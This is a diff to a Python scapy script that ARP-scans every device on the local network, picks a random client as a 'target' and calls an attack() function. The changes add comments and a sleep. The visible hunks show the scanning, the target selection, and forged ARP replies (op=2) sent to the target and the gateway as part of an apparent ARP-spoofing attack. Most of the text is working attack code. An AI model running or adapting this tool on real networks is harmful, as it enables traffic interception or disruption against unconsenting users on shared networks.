@@ -12,7 +12,7 @@ interfaces = ['en0', 'en1']
 clients = []
 
 def get_subnet_mask(mask):
-    # Convert the mask to an integer
+    # Convert the mask from hex to an integer
     mask_int = int(mask, 16)
 
     # Convert the mask to dotted decimal format
@@ -22,16 +22,18 @@ def get_subnet_mask(mask):
 
 def scan_network(gateway, subnet):
 
-    # Convert subnet mask to CIDR notation
+    # Convert subnet mask to CIDR notation (/X)
     cidr = sum(bin(int(x)).count('1') for x in subnet.split('.'))
     ip_range = '{}{}'.format(gateway, '/{}'.format(cidr))
 
+    #Start ARP scan on network
     arp = ARP(pdst=ip_range)
     ether = Ether(dst='ff:ff:ff:ff:ff:ff')
     packet = ether/arp
 
     result = srp(packet, timeout=2, verbose=0)[0]
 
+    #Append every result in clients array
     for sent, received in result:
         clients.append({'ip': received.psrc, 'mac': received.hwsrc})
 
@@ -54,7 +56,8 @@ def attack():
         return
 
     target = random.choice(candidates)
-
+    
+    #Show the target in the Console
     print 'Target IP address: {}'.format(target['ip'])
     print 'Target MAC address: {}'.format(target['mac'])
     print
@@ -96,6 +99,9 @@ def attack():
         for number in range(4):
             send(ARP(op=2, pdst=target['ip'], psrc=gateway_ip, hwdst=original_target_mac))
             send(ARP(op=2, pdst=gateway_ip, psrc=target['ip'], hwdst=original_gateway_mac))
+            
+            #Debounce
+            time.sleep(1)
 
 for iface in interfaces:
     # Get local IP, MAC address, and subnet mask for the current interface
@@ -126,5 +132,5 @@ for iface in interfaces:
             # Perform ARP scan to get IP and MAC addresses of devices on the network
             scan_network(gateway_ip, get_subnet_mask(subnet_mask))
 
-            # Perform target selection
+            # Perform target selection and attack
             attack()
